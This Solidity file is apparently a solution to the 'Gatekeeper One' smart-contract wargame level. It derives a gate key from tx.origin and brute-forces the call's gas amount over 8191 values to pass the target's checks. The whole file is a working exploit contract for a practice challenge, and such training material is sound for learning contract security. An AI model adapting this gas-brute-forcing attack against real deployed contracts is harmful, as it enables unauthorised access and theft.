// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract AttackGatekeeperOne {
    function enter(address _target) external {
        IGatekeeperOne target = IGatekeeperOne(_target);

        uint16 k = uint16(uint160(tx.origin));
        uint64 newK = uint64(1 << 63) + uint64(k);
        bytes8 gateKey = bytes8(newK);

        for (uint256 i = 0; i <= 8191; i++) {
            try target.enter{gas: i + (8191 * 2)}(gateKey) {
                break;
            } catch {}
        }
        require(target.enter(gateKey), "Unable to enter");
    }
}
